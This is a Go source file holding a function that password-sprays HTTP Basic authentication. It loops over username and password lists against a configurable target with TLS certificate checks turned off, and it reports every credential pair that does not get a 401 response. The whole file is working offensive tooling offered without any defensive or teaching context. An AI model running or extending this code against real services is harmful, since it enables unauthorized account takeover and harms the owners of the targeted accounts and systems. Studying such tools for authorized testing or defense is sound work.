package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"sync"
)



func basicSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
	defer wg.Done()
	if taskToRun.target.port == 0 {
		taskToRun.target.port = 80
	}
	internalCounter := 0
	for _,password := range taskToRun.passwords {
		for _,username := range taskToRun.usernames {
			if internalCounter >= *storeResult {
				headerValue := base64.StdEncoding.EncodeToString([]byte(username+":"+password))
				http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
				client := &http.Client{}
				req, _ := http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
				req.Header.Set("Authorization", "Basic "+headerValue)
				res, _ := client.Do(req)
				if res.StatusCode == 401 {
					fmt.Print("-")
				} else {
					fmt.Print("+")
					channelToCommunicate <- username+":"+password
				}
				*storeResult++
			} else {
			}
			internalCounter++
		}
	}


}